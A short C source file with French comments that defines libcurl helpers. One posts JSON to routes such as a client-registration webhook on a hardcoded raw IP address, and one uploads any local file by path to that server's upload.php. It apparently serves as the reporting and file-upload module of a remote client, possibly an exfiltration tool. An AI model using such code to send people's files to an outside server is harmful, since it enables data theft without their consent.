#include <stdio.h>
#include <string.h>
#include <curl/curl.h>
#include <sys/stat.h>
#include <fcntl.h>

const char SERVER_URL[] = "http://195.15.243.173/";

size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp)
{

    /*Permet de ne pas afficher la reponse du serveur dans le terminal
    (ne fait rien)*/

    return size * nmemb;
};

void send_to_server(char *route, char *data)
{

    /*Evoyer une requette au serveur, avec une route (chemain) spécifié ex: /webhook/client.php
    et des données sous format json ex: '{"client_id":1}'*/

    CURL *curl;
    struct curl_slist *headers = NULL;
    long status_code = 0;
    curl = curl_easy_init();

    char final_url[256];
    snprintf(final_url, 256, "%s%s", SERVER_URL, route);

    if (curl)
    {
        printf("[*] Requette sur %s\n", route);

        curl_easy_setopt(curl, CURLOPT_URL, final_url);

        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        curl_easy_setopt(curl, CURLOPT_POST, 1L); // 1L 1: je veut passer en requette post,  L: la valeur 1 est de type long
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);

        curl_easy_perform(curl); // envoyer la requette

        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &status_code);

        curl_easy_cleanup(curl);
        if (status_code == 200)
        {
            printf("[+] La requette a bien ete envoyee\n");
        }
        else
        {
            printf("[-] Erreur sur l'envoie de la requette, status code = %ld\n", status_code);
        };
    }
    else
    {
        printf("[-] Erreur inconnue sur l'envoie de la requette\n");
    }
};

int upload_to_server(char *file_path)
{

    /* Lire et Upload un fichier via son path sur le serveur via
    requette  PUT sur /upload.php*/

    CURL *curl;
    long status_code = 0;
    CURLcode res;
    struct stat file_info;

    char final_url[256];
    snprintf(final_url, 256, "%s%s", SERVER_URL, "upload.php");

    // lire le fichier
    FILE *fd;
    fd = fopen(file_path, "rb");
    if (!fd)
        return -1;

    if (fstat(fileno(fd), &file_info) != 0)
        return -1;

    curl = curl_easy_init();
    if (curl)
    {
        printf("[*] Requette sur /upload.php\n");
        curl_easy_setopt(curl, CURLOPT_URL, final_url);
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
        curl_easy_setopt(curl, CURLOPT_READDATA, fd);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_INFILESIZE_LARGE, (curl_off_t)file_info.st_size);
        res = curl_easy_perform(curl);
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &status_code);
        if (status_code == 200)
        {
            printf("[+] La requette a bien ete envoyee\n");
        }
        else
        {
            printf("[-] Erreur sur l'envoie de la requette, status code != 200 ou le serveur est indisponible\n");
        };
        curl_easy_cleanup(curl);
    }
};
